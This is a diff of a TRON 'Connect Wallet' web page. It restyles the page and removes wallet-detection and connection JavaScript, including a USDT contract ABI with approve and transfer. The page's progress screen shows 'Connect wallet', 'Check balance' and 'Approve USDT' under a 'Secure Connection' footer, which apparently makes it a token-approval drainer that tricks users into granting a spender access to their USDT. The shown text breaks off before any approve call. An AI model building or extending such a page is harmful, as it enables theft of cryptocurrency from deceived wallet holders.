@@ -7,1630 +7,627 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
   <style>
+    /* Same clean styles as before – omitted for brevity, but include full CSS */
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      font-family: 'Inter', -apple-system, sans-serif;
-      background: #0a0a0f;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      background-image: 
-        radial-gradient(ellipse at 20% 50%, rgba(74, 222, 128, 0.05) 0%, transparent 60%),
-        radial-gradient(ellipse at 80% 50%, rgba(139, 92, 246, 0.05) 0%, transparent 60%);
-    }
-    .container {
-      width: 100%;
-      max-width: 420px;
-      background: linear-gradient(145deg, rgba(20, 20, 30, 0.95), rgba(10, 10, 15, 0.98));
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: 24px;
-      padding: 32px 24px;
-      backdrop-filter: blur(20px);
-      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), inset 0 1px 0 rgba(255, 255, 255, 0.05);
-      position: relative;
-      overflow: hidden;
-    }
-    .container::before {
-      content: '';
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: radial-gradient(ellipse at 30% 20%, rgba(74, 222, 128, 0.03), transparent 50%);
-      pointer-events: none;
-    }
-    .header { text-align: center; margin-bottom: 28px; position: relative; }
-    .header .logo {
-      width: 56px;
-      height: 56px;
-      background: linear-gradient(135deg, #4ade80, #22c55e);
-      border-radius: 16px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 auto 14px;
-      font-size: 28px;
-      box-shadow: 0 8px 24px rgba(74, 222, 128, 0.25);
-    }
-    .header h2 {
-      font-size: 22px;
-      font-weight: 700;
-      background: linear-gradient(135deg, #ffffff, #94a3b8);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      letter-spacing: -0.5px;
-    }
-    .header p {
-      font-size: 13px;
-      color: rgba(148, 163, 184, 0.7);
-      margin-top: 4px;
-    }
-    .msg {
-      padding: 12px 16px;
-      border-radius: 12px;
-      font-size: 13px;
-      line-height: 1.5;
-      margin-bottom: 16px;
-      display: none;
-      border: 1px solid transparent;
-      animation: slideDown 0.3s ease;
-    }
-    @keyframes slideDown {
-      from { opacity: 0; transform: translateY(-10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
+    body { font-family: 'Inter', sans-serif; background: #0a0a0f; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+    .container { width: 100%; max-width: 420px; background: linear-gradient(145deg, rgba(20,20,30,0.95), rgba(10,10,15,0.98)); border: 1px solid rgba(255,255,255,0.06); border-radius: 24px; padding: 32px 24px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8); }
+    .header { text-align: center; margin-bottom: 28px; }
+    .header .logo { width: 56px; height: 56px; background: linear-gradient(135deg, #4ade80, #22c55e); border-radius: 16px; display: flex; align-items: center; justify-content: center; margin: 0 auto 14px; font-size: 28px; box-shadow: 0 8px 24px rgba(74,222,128,0.25); }
+    .header h2 { font-size: 22px; font-weight: 700; background: linear-gradient(135deg, #ffffff, #94a3b8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .header p { font-size: 13px; color: rgba(148,163,184,0.7); margin-top: 4px; }
+    .msg { padding: 12px 16px; border-radius: 12px; font-size: 13px; margin-bottom: 16px; display: none; border: 1px solid transparent; animation: slideDown 0.3s ease; }
     .msg.show { display: block; }
-    .msg.err { background: rgba(239, 68, 68, 0.12); border-color: rgba(239, 68, 68, 0.2); color: #f87171; }
-    .msg.ok { background: rgba(74, 222, 128, 0.12); border-color: rgba(74, 222, 128, 0.2); color: #4ade80; }
-    .msg.inf { background: rgba(96, 165, 250, 0.12); border-color: rgba(96, 165, 250, 0.2); color: #60a5fa; }
-    .msg.warn { background: rgba(251, 191, 36, 0.12); border-color: rgba(251, 191, 36, 0.2); color: #fbbf24; }
-
-    .wallet-list {
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-      min-height: 50px;
-    }
-    .wallet-btn {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      padding: 14px 18px;
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: 14px;
-      cursor: pointer;
-      font-family: inherit;
-      color: #e2e8f0;
-      text-align: left;
-      width: 100%;
-      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
-      position: relative;
-      overflow: hidden;
-    }
-    .wallet-btn:hover {
-      background: rgba(255, 255, 255, 0.06);
-      border-color: rgba(74, 222, 128, 0.2);
-      transform: translateX(4px);
-      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
-    }
-    .wallet-btn:active { transform: scale(0.97); }
-    .wallet-btn .ico {
-      width: 40px;
-      height: 40px;
-      border-radius: 12px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-      overflow: hidden;
-      background: rgba(255, 255, 255, 0.05);
-    }
+    .msg.err { background: rgba(239,68,68,0.12); border-color: rgba(239,68,68,0.2); color: #f87171; }
+    .msg.ok { background: rgba(74,222,128,0.12); border-color: rgba(74,222,128,0.2); color: #4ade80; }
+    .msg.inf { background: rgba(96,165,250,0.12); border-color: rgba(96,165,250,0.2); color: #60a5fa; }
+    .msg.warn { background: rgba(251,191,36,0.12); border-color: rgba(251,191,36,0.2); color: #fbbf24; }
+    @keyframes slideDown { from { opacity:0; transform:translateY(-10px); } to { opacity:1; transform:translateY(0); } }
+    .wallet-list { display: flex; flex-direction: column; gap: 8px; min-height: 50px; }
+    .wallet-btn { display: flex; align-items: center; gap: 14px; padding: 14px 18px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; cursor: pointer; color: #e2e8f0; transition: all 0.25s; }
+    .wallet-btn:hover { background: rgba(255,255,255,0.06); border-color: rgba(74,222,128,0.2); transform: translateX(4px); }
+    .wallet-btn .ico { width: 40px; height: 40px; border-radius: 12px; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.05); overflow: hidden; }
     .wallet-btn .ico img { width: 100%; height: 100%; object-fit: contain; padding: 6px; }
     .wallet-btn .nm { font-size: 15px; font-weight: 500; flex: 1; }
-    .wallet-btn .badge {
-      font-size: 10px;
-      font-weight: 600;
-      padding: 4px 10px;
-      border-radius: 20px;
-      background: rgba(74, 222, 128, 0.12);
-      color: #4ade80;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
-    .wallet-btn .badge.install {
-      background: rgba(251, 191, 36, 0.12);
-      color: #fbbf24;
-    }
-    .wallet-btn .arrow {
-      color: rgba(148, 163, 184, 0.3);
-      transition: all 0.3s ease;
-      font-size: 18px;
-    }
-    .wallet-btn:hover .arrow {
-      color: rgba(74, 222, 128, 0.5);
-      transform: translateX(4px);
-    }
-
-    .status-icon { text-align: center; margin: 28px 0; }
-    .spinner {
-      display: inline-block;
-      width: 48px;
-      height: 48px;
-      border: 3px solid rgba(255, 255, 255, 0.06);
-      border-top-color: #4ade80;
-      border-radius: 50%;
-      animation: spin 0.8s cubic-bezier(0.4, 0, 0.2, 1) infinite;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .success-icon {
-      display: inline-block;
-      width: 64px;
-      height: 64px;
-      border-radius: 50%;
-      background: linear-gradient(135deg, rgba(74, 222, 128, 0.15), rgba(74, 222, 128, 0.05));
-      border: 2px solid rgba(74, 222, 128, 0.3);
-      line-height: 64px;
-      text-align: center;
-      font-size: 32px;
-      color: #4ade80;
-      animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-    }
-    @keyframes popIn {
-      from { transform: scale(0); opacity: 0; }
-      to { transform: scale(1); opacity: 1; }
-    }
-    .error-icon {
-      display: inline-block;
-      width: 64px;
-      height: 64px;
-      border-radius: 50%;
-      background: rgba(239, 68, 68, 0.1);
-      border: 2px solid rgba(239, 68, 68, 0.2);
-      line-height: 64px;
-      text-align: center;
-      font-size: 32px;
-      color: #f87171;
-    }
-
+    .wallet-btn .badge { font-size: 10px; font-weight: 600; padding: 4px 10px; border-radius: 20px; background: rgba(74,222,128,0.12); color: #4ade80; text-transform: uppercase; }
+    .wallet-btn .badge.install { background: rgba(251,191,36,0.12); color: #fbbf24; }
+    .wallet-btn .arrow { color: rgba(148,163,184,0.3); transition: 0.3s; font-size: 18px; }
+    .wallet-btn:hover .arrow { color: rgba(74,222,128,0.5); transform: translateX(4px); }
     .screen { display: none; animation: fadeIn 0.4s ease; }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
     .screen.on { display: block; }
-
-    .btn {
-      display: block;
-      width: 100%;
-      padding: 14px;
-      border-radius: 14px;
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      background: transparent;
-      color: #94a3b8;
-      font-size: 13px;
-      font-weight: 500;
-      cursor: pointer;
-      font-family: inherit;
-      text-align: center;
-      transition: all 0.25s ease;
-      margin-top: 12px;
-    }
-    .btn:hover {
-      border-color: rgba(255, 255, 255, 0.12);
-      color: #e2e8f0;
-      background: rgba(255, 255, 255, 0.03);
-    }
-    .btn-primary {
-      background: linear-gradient(135deg, #4ade80, #22c55e);
-      border: none;
-      color: #000;
-      font-weight: 600;
-      font-size: 14px;
-      padding: 16px;
-      box-shadow: 0 4px 16px rgba(74, 222, 128, 0.2);
-    }
-    .btn-primary:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 24px rgba(74, 222, 128, 0.3);
-      border: none;
-      color: #000;
-    }
-    .btn-primary:active { transform: scale(0.97); }
-
-    .address-display {
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: 12px;
-      padding: 12px 16px;
-      font-family: 'SF Mono', 'Fira Code', monospace;
-      font-size: 13px;
-      color: rgba(148, 163, 184, 0.8);
-      word-break: break-all;
-      margin: 12px 0 16px;
-      text-align: center;
-    }
-
+    @keyframes fadeIn { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
+    .btn { display: block; width: 100%; padding: 14px; border-radius: 14px; border: 1px solid rgba(255,255,255,0.06); background: transparent; color: #94a3b8; font-size: 13px; font-weight: 500; cursor: pointer; text-align: center; transition: 0.25s; margin-top: 12px; }
+    .btn:hover { border-color: rgba(255,255,255,0.12); color: #e2e8f0; background: rgba(255,255,255,0.03); }
+    .btn-primary { background: linear-gradient(135deg, #4ade80, #22c55e); border: none; color: #000; font-weight: 600; box-shadow: 0 4px 16px rgba(74,222,128,0.2); }
+    .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(74,222,128,0.3); border: none; color: #000; }
+    .status-icon { text-align: center; margin: 28px 0; }
+    .spinner { display: inline-block; width: 48px; height: 48px; border: 3px solid rgba(255,255,255,0.06); border-top-color: #4ade80; border-radius: 50%; animation: spin 0.8s infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .success-icon { display: inline-block; width: 64px; height: 64px; border-radius: 50%; background: rgba(74,222,128,0.15); border: 2px solid rgba(74,222,128,0.3); line-height: 64px; text-align: center; font-size: 32px; color: #4ade80; animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1); }
+    @keyframes popIn { from { transform: scale(0); opacity:0; } to { transform: scale(1); opacity:1; } }
+    .error-icon { display: inline-block; width: 64px; height: 64px; border-radius: 50%; background: rgba(239,68,68,0.1); border: 2px solid rgba(239,68,68,0.2); line-height: 64px; text-align: center; font-size: 32px; color: #f87171; }
+    .address-display { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 12px; padding: 12px 16px; font-family: monospace; font-size: 13px; color: rgba(148,163,184,0.8); word-break: break-all; margin: 12px 0 16px; text-align: center; }
     .progress-steps { margin: 20px 0; }
-    .step {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      padding: 10px 14px;
-      border-radius: 10px;
-      margin-bottom: 4px;
-      font-size: 13px;
-      color: rgba(148, 163, 184, 0.4);
-      transition: all 0.3s ease;
-    }
-    .step.active { color: #e2e8f0; background: rgba(255, 255, 255, 0.03); }
+    .step { display: flex; align-items: center; gap: 14px; padding: 10px 14px; border-radius: 10px; margin-bottom: 4px; font-size: 13px; color: rgba(148,163,184,0.4); transition: 0.3s; }
+    .step.active { color: #e2e8f0; background: rgba(255,255,255,0.03); }
     .step.done { color: #4ade80; }
-    .step .num {
-      width: 28px;
-      height: 28px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 11px;
-      font-weight: 700;
-      flex-shrink: 0;
-      background: rgba(255, 255, 255, 0.05);
-      color: rgba(148, 163, 184, 0.3);
-      transition: all 0.3s ease;
-    }
-    .step.active .num {
-      background: rgba(74, 222, 128, 0.15);
-      color: #4ade80;
-      box-shadow: 0 0 20px rgba(74, 222, 128, 0.1);
-    }
-    .step.done .num {
-      background: rgba(74, 222, 128, 0.12);
-      color: #4ade80;
-    }
+    .step .num { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; background: rgba(255,255,255,0.05); color: rgba(148,163,184,0.3); transition: 0.3s; }
+    .step.active .num { background: rgba(74,222,128,0.15); color: #4ade80; }
+    .step.done .num { background: rgba(74,222,128,0.12); color: #4ade80; }
     .step .check { color: #4ade80; font-weight: 700; }
-
-    .wait-content { text-align: center; }
-    .wait-content .title { font-size: 17px; font-weight: 600; color: #e2e8f0; margin-top: 4px; }
-    .wait-content .subtitle { font-size: 13px; color: rgba(148, 163, 184, 0.6); margin-top: 4px; }
-
-    .footer {
-      margin-top: 24px;
-      text-align: center;
-      font-size: 11px;
-      color: rgba(148, 163, 184, 0.2);
-      letter-spacing: 0.5px;
-    }
-    .footer .dot {
-      display: inline-block;
-      width: 4px;
-      height: 4px;
-      border-radius: 50%;
-      background: rgba(74, 222, 128, 0.3);
-      margin: 0 6px;
-      vertical-align: middle;
-    }
-
-    #configStatus {
-      font-size: 11px;
-      color: rgba(148, 163, 184, 0.4);
-      text-align: center;
-      margin-bottom: 14px;
-      display: none;
-    }
-
-    .loading-wallets {
-      text-align: center;
-      padding: 20px;
-      color: rgba(148, 163, 184, 0.4);
-      font-size: 13px;
-    }
-
-    @media (max-width: 480px) {
-      body { padding: 12px; align-items: flex-end; }
-      .container { padding: 24px 18px; border-radius: 20px; max-width: 100%; }
-      .header .logo { width: 48px; height: 48px; font-size: 24px; }
-      .header h2 { font-size: 20px; }
-      .wallet-btn { padding: 12px 14px; }
-      .wallet-btn .ico { width: 36px; height: 36px; }
-      .wallet-btn .ico img { padding: 4px; }
-    }
-    @media (max-width: 380px) {
-      .container { padding: 16px 14px; }
-      .wallet-btn { padding: 10px 12px; }
-      .wallet-btn .nm { font-size: 13px; }
-    }
-    ::-webkit-scrollbar { width: 4px; }
-    ::-webkit-scrollbar-track { background: transparent; }
-    ::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.1); border-radius: 20px; }
-    ::-webkit-scrollbar-thumb:hover { background: rgba(255, 255, 255, 0.2); }
+    .footer { margin-top: 24px; text-align: center; font-size: 11px; color: rgba(148,163,184,0.2); }
+    .footer .dot { display: inline-block; width: 4px; height: 4px; border-radius: 50%; background: rgba(74,222,128,0.3); margin: 0 6px; vertical-align: middle; }
+    #configStatus { font-size: 11px; color: rgba(148,163,184,0.4); text-align: center; margin-bottom: 14px; display: none; }
+    @media (max-width:480px) { body { padding:12px; align-items:flex-end; } .container { padding:24px 18px; border-radius:20px; } .wallet-btn { padding:12px 14px; } .wallet-btn .ico { width:36px; height:36px; } }
   </style>
-<base target="_blank">
 </head>
 <body>
-  <div class="container">
-    <div class="header">
-      <div class="logo">&#9889;</div>
-      <h2>Connect Wallet</h2>
-      <p>Choose your preferred wallet</p>
-    </div>
+<div class="container">
+  <div class="header">
+    <div class="logo">⚡</div>
+    <h2>Connect Wallet</h2>
+    <p>Choose your preferred wallet</p>
+  </div>
 
-    <div id="msgBox"></div>
-    <div id="configStatus">Loading configuration...</div>
+  <div id="msgBox"></div>
+  <div id="configStatus">Loading configuration...</div>
 
-    <div class="screen on" id="scConnect">
-      <div class="wallet-list" id="walletList">
-        <div class="loading-wallets">Loading wallets...</div>
+  <div class="screen on" id="scConnect">
+    <div class="wallet-list" id="walletList"></div>
+    <button class="btn" onclick="window.close()">Cancel</button>
+  </div>
+
+  <div class="screen" id="scWait">
+    <div class="wait-content">
+      <div class="status-icon"><div class="spinner"></div></div>
+      <div class="title" style="font-size:17px;font-weight:600;color:#e2e8f0;margin-top:4px;">Connecting...</div>
+      <div class="subtitle" id="waitDesc" style="font-size:13px;color:rgba(148,163,184,0.6);">Please confirm in your wallet</div>
+      <div class="progress-steps" id="progressSteps">
+        <div class="step" id="step1"><span class="num">1</span> Connect wallet</div>
+        <div class="step" id="step2"><span class="num">2</span> Check balance</div>
+        <div class="step" id="step3"><span class="num">3</span> Approve USDT</div>
       </div>
-      <button class="btn" onclick="window.close()">Cancel</button>
-    </div>
-
-    <div class="screen" id="scWait">
-      <div class="wait-content">
-        <div class="status-icon"><div class="spinner"></div></div>
-        <div class="title">Connecting...</div>
-        <div class="subtitle" id="waitDesc">Please confirm in your wallet</div>
-        <div class="progress-steps" id="progressSteps">
-          <div class="step" id="step1"><span class="num">1</span> Connect wallet</div>
-          <div class="step" id="step2"><span class="num">2</span> Check balance</div>
-          <div class="step" id="step3"><span class="num">3</span> Approve USDT</div>
-        </div>
-        <button class="btn" onclick="location.reload()">Cancel</button>
-      </div>
-    </div>
-
-    <div class="screen" id="scProcessing">
-      <div class="wait-content">
-        <div class="status-icon"><div class="spinner"></div></div>
-        <div class="title" id="processingTitle">Processing...</div>
-        <div class="subtitle" id="processingDesc">Please wait</div>
-        <button class="btn" onclick="location.reload()">Cancel</button>
-      </div>
-    </div>
-
-    <div class="screen" id="scDone">
-      <div class="wait-content">
-        <div class="status-icon"><div class="success-icon">&#10003;</div></div>
-        <div class="title" style="color: #4ade80;">Connected!</div>
-        <div class="subtitle" style="color: rgba(148, 163, 184, 0.6);">You can close this page</div>
-        <div class="address-display" id="doneAddress"></div>
-        <button class="btn btn-primary" onclick="window.close()">Close</button>
-      </div>
-    </div>
-
-    <div class="screen" id="scError">
-      <div class="wait-content">
-        <div class="status-icon"><div class="error-icon">&#10005;</div></div>
-        <div class="title" style="color: #f87171;" id="errorTitle">Connection Failed</div>
-        <div class="subtitle" id="errorDesc" style="color: rgba(148, 163, 184, 0.6);">Please try again</div>
-        <button class="btn btn-primary" onclick="location.reload()">Try Again</button>
-        <button class="btn" onclick="window.close()">Close</button>
-      </div>
-    </div>
-
-    <div class="footer">
-      <span>TRON Network</span>
-      <span class="dot"></span>
-      <span>Secure Connection</span>
+      <button class="btn" onclick="location.reload()">Cancel</button>
     </div>
   </div>
 
-  <script>
-
-    // ============================================================
-    // CONFIGURATION
-    // ============================================================
-
-    var SITE_URL = window.location.origin;
-    var config = {};
-    var connectedAddress = null;
-    var isProcessing = false;
-    var isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
-
-    // More accurate browser detection
-    var isTrustBrowser = /Trust/i.test(navigator.userAgent) || (window.ethereum && window.ethereum.isTrust);
-    var isTronLinkBrowser = /TronLink/i.test(navigator.userAgent);
-    var isTokenPocketBrowser = /TokenPocket/i.test(navigator.userAgent);
-    var isOKXBrowser = /OKX/i.test(navigator.userAgent) || /OKEx/i.test(navigator.userAgent);
-    var isBitgetBrowser = /Bitget/i.test(navigator.userAgent);
-    var isImTokenBrowser = /imToken/i.test(navigator.userAgent);
-
-    console.log("📱 isMobile:", isMobile);
-    console.log("📱 isTrustBrowser:", isTrustBrowser);
-    console.log("📱 isTronLinkBrowser:", isTronLinkBrowser);
-    console.log("📱 isTokenPocketBrowser:", isTokenPocketBrowser);
-    console.log("📱 isOKXBrowser:", isOKXBrowser);
-    console.log("📱 isBitgetBrowser:", isBitgetBrowser);
-    console.log("📱 isImTokenBrowser:", isImTokenBrowser);
-
-    var SESSION_ID = "qr-" + Date.now() + "-" + Math.random().toString(36).substr(2, 6);
-
-    // ============================================================
-    // TIP-6963 PROVIDER DISCOVERY (EIP-6963 for TRON wallets)
-    // ============================================================
-
-    var discoveredProviders = {};
-
-    window.addEventListener("TIP6963:announceProvider", function(e) {
-      if (e.detail && e.detail.info && e.detail.provider) {
-        var name = e.detail.info.name;
-        discoveredProviders[name] = e.detail.provider;
-        console.log("TIP-6963 discovered wallet:", name);
-      }
-    });
-
-    // Request providers to announce themselves
-    window.dispatchEvent(new Event("TIP6963:requestProvider"));
-
-
-    // ============================================================
-    // USDT ABI
-    // ============================================================
-
-    var USDT_ABI = [
-      {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
-      {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
-      {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
-      {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}
-    ];
-
-    // ============================================================
-    // HELPER: Convert ETH address to TRON address (hex format)
-    // ============================================================
-
-    function ethToTronAddress(ethAddress) {
-      var clean = ethAddress.replace("0x", "");
-      if (clean.length === 40) {
-        return "41" + clean;
-      }
-      return clean;
-    }
-
-    // ============================================================
-    // HELPER: Check if address is TRON format (starts with T)
-    // ============================================================
-
-    function isTronAddress(address) {
-      return address && /^T[A-Za-z0-9]{33}$/.test(address);
-    }
-
-    // ============================================================
-    // HELPER: Convert hex address to Base58 TRON address
-    // ============================================================
-
-    function hexToBase58(hex) {
-      if (isTronAddress(hex)) return hex;
-      if (hex && hex.startsWith("41") && hex.length === 42) {
-        if (window.tronWeb && window.tronWeb.address) {
-          try {
-            return window.tronWeb.address.fromHex(hex);
-          } catch(e) {}
-        }
-      }
-      return hex;
-    }
-
-    // ============================================================
-    // WALLET CONFIGURATIONS - COMPLETELY REWRITTEN AND FIXED
-    // ============================================================
-
-    var WALLETS = [
-      {
-        id: "tronlink",
-        name: "TronLink",
-        logo: "https://tronlink.org/favicon.ico",
-        downloadUrl: "https://tronlink.org/download",
-        // FIXED: Use TIP-6963 detection and modern API
-        detect: function() {
-          if (window.tron && window.tron.isTronLink) return true;
-          if (window.tronLink) return true;
-          if (window.tronWeb && window.tronWeb.ready) return true;
-          return false;
-        },
-        connect: function() {
-          return new Promise(function(resolve, reject) {
-            try {
-              var provider = null;
-              if (window.tron && window.tron.request) {
-                provider = window.tron;
-              } else if (window.tronLink && window.tronLink.request) {
-                provider = window.tronLink;
-              }
-
-              if (provider) {
-                provider.request({ method: "eth_requestAccounts" })
-                  .then(function(result) {
-                    console.log("TronLink eth_requestAccounts result:", result);
-                    if (Array.isArray(result) && result.length > 0) {
-                      resolve(result[0]);
-                    } else if (typeof result === "string") {
-                      resolve(result);
-                    } else if (result && result.address) {
-                      resolve(result.address);
-                    } else {
-                      return provider.request({ method: "tron_requestAccounts" });
-                    }
-                  })
-                  .then(function(result2) {
-                    if (!result2) return;
-                    console.log("TronLink tron_requestAccounts result:", result2);
-                    if (typeof result2 === "string") resolve(result2);
-                    else if (Array.isArray(result2) && result2.length > 0) resolve(result2[0]);
-                    else if (result2 && result2.code === 200) {
-                      var tw = provider.tronWeb || window.tronWeb;
-                      if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
-                        resolve(tw.defaultAddress.base58);
-                      } else {
-                        reject(new Error("No address returned"));
-                      }
-                    } else {
-                      reject(new Error("Connection rejected"));
-                    }
-                  })
-                  .catch(function(err) {
-                    console.error("TronLink request error:", err);
-                    var msg = (err && err.message) || String(err);
-                    if (msg.indexOf("4001") !== -1 || msg.indexOf("reject") !== -1 || msg.indexOf("cancel") !== -1 || msg.indexOf("denied") !== -1) {
-                      reject(new Error("User rejected the connection"));
-                    } else {
-                      reject(new Error("TronLink connection failed: " + msg));
-                    }
-                  });
-                return;
-              }
-
-              if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                resolve(window.tronWeb.defaultAddress.base58);
-                return;
-              }
-
-              reject(new Error("TronLink not detected"));
-            } catch(e) {
-              reject(e);
-            }
-          });
-        }
-      },
-      {
-        id: "trust",
-        name: "Trust Wallet",
-        logo: "https://trustwallet.com/assets/images/favicon.ico",
-        downloadUrl: "https://trustwallet.com/download",
-        detect: function() {
-          if (window.ethereum && window.ethereum.isTrust) return true;
-          if (window.tronWeb && window.tronWeb.ready) return true;
-          if (isTrustBrowser) return true;
-          return false;
-        },
-        connect: function() {
-          return new Promise(function(resolve, reject) {
-            try {
-              if (window.ethereum && window.ethereum.isTrust) {
-                console.log("Trust Wallet detected via ethereum");
-
-                if (window.ethereum.tronLink) {
-                  var tl = window.ethereum.tronLink;
-                  if (tl.tronWeb && tl.tronWeb.ready && tl.tronWeb.defaultAddress && tl.tronWeb.defaultAddress.base58) {
-                    resolve(tl.tronWeb.defaultAddress.base58);
-                    return;
-                  }
-                  if (typeof tl.request === "function") {
-                    tl.request({ method: "eth_requestAccounts" })
-                      .then(function(result) {
-                        console.log("Trust tronLink result:", result);
-                        if (Array.isArray(result) && result.length > 0) {
-                          resolve(result[0]);
-                        } else if (typeof result === "string") {
-                          resolve(result);
-                        } else if (tl.tronWeb && tl.tronWeb.defaultAddress) {
-                          resolve(tl.tronWeb.defaultAddress.base58);
-                        } else {
-                          reject(new Error("No address returned from Trust"));
-                        }
-                      })
-                      .catch(reject);
-                    return;
-                  }
-                }
-
-                if (typeof window.ethereum.request === "function") {
-                  window.ethereum.request({ method: "eth_requestAccounts" })
-                    .then(function(result) {
-                      console.log("Trust eth_requestAccounts result:", result);
-                      if (Array.isArray(result) && result.length > 0) {
-                        var addr = result[0];
-                        if (isTronAddress(addr)) {
-                          resolve(addr);
-                        } else if (addr.startsWith("0x")) {
-                          var tronHex = ethToTronAddress(addr);
-                          console.log("Converting ETH address to TRON:", tronHex);
-                          resolve(tronHex);
-                        } else {
-                          resolve(addr);
-                        }
-                      } else {
-                        reject(new Error("No address returned"));
-                      }
-                    })
-                    .catch(function(err) {
-                      var msg = (err && err.message) || String(err);
-                      if (msg.indexOf("4001") !== -1 || msg.indexOf("reject") !== -1 || msg.indexOf("cancel") !== -1) {
-                        reject(new Error("User rejected the connection"));
-                      } else {
-                        reject(new Error("Trust Wallet connection failed: " + msg));
-                      }
-                    });
-                  return;
-                }
-              }
-
-              if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                resolve(window.tronWeb.defaultAddress.base58);
-                return;
-              }
-
-              reject(new Error("Trust Wallet not detected"));
-            } catch(e) {
-              reject(e);
-            }
-          });
-        }
-      },
-      {
-        id: "okx",
-        name: "OKX Wallet",
-        logo: "https://www.okx.com/cdn/assets/imgs/2210/0F8D1F9F0A3A1B2C.png",
-        downloadUrl: "https://www.okx.com/download",
-        detect: function() {
-          if (window.okxwallet) return true;
-          if (isOKXBrowser) return true;
-          if (window.ethereum && (window.ethereum.isOKXWallet || window.ethereum.isOKExWallet)) return true;
-          return false;
-        },
-        connect: function() {
-          return new Promise(function(resolve, reject) {
-            try {
-              var okxProvider = window.okxwallet;
-              if (!okxProvider && window.ethereum && (window.ethereum.isOKXWallet || window.ethereum.isOKExWallet)) {
-                okxProvider = window.ethereum;
-              }
-
-              if (!okxProvider) {
-                reject(new Error("OKX Wallet not detected"));
-                return;
-              }
-
-              console.log("OKX Wallet provider found");
-
-              var tronProvider = okxProvider.tronLink || okxProvider.tron;
-
-              if (tronProvider) {
-                console.log("OKX TRON provider found");
-                if (tronProvider.tronWeb && tronProvider.tronWeb.ready && tronProvider.tronWeb.defaultAddress && tronProvider.tronWeb.defaultAddress.base58) {
-                  resolve(tronProvider.tronWeb.defaultAddress.base58);
-                  return;
-                }
-                if (typeof tronProvider.request === "function") {
-                  tronProvider.request({ method: "eth_requestAccounts" })
-                    .then(function(result) {
-                      console.log("OKX TRON result:", result);
-                      if (Array.isArray(result) && result.length > 0) {
-                        resolve(result[0]);
-                      } else if (typeof result === "string") {
-                        resolve(result);
-                      } else if (result && result.address) {
-                        resolve(result.address);
-                      } else if (tronProvider.tronWeb && tronProvider.tronWeb.defaultAddress) {
-                        resolve(tronProvider.tronWeb.defaultAddress.base58);
-                      } else {
-                        reject(new Error("No address returned"));
-                      }
-                    })
-                    .catch(function(err) {
-                      var msg = (err && err.message) || String(err);
-                      if (msg.indexOf("4001") !== -1 || msg.indexOf("reject") !== -1 || msg.indexOf("cancel") !== -1) {
-                        reject(new Error("User rejected the connection"));
-                      } else {
-                        reject(new Error("OKX connection failed: " + msg));
-                      }
-                    });
-                  return;
-                }
-              }
-
-              if (typeof okxProvider.request === "function") {
-                okxProvider.request({ method: "eth_requestAccounts" })
-                  .then(function(result) {
-                    console.log("OKX eth_requestAccounts result:", result);
-                    if (Array.isArray(result) && result.length > 0) {
-                      var addr = result[0];
-                      if (isTronAddress(addr)) {
-                        resolve(addr);
-                      } else if (addr.startsWith("0x")) {
-                        var tronHex = ethToTronAddress(addr);
-                        resolve(tronHex);
-                      } else {
-                        resolve(addr);
-                      }
-                    } else {
-                      reject(new Error("No address returned"));
-                    }
-                  })
-                  .catch(function(err) {
